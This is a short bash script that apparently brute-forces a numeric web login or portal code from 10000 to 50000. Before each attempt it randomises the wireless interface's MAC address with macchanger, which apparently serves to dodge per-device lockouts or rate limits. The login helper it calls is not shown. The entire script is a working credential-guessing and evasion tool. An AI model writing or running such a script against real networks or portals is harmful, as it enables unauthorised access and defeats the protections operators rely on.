#!/bin/bash

interface='wlp0s20f3'

for x in {10000..50000};do
  mac=$(printf '%02X:%02X:%02X:%02X:%02X:%02X' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256])
  ip link set $interface down
  echo $interface is down
  sleep 2
  macchanger --mac $mac $interface
  sleep 1
  ip link set $interface up
  echo $interface is up
  sleep 2
  echo sending weblogin
  /home/xrenne/.local/bin/weblogin $x &
done
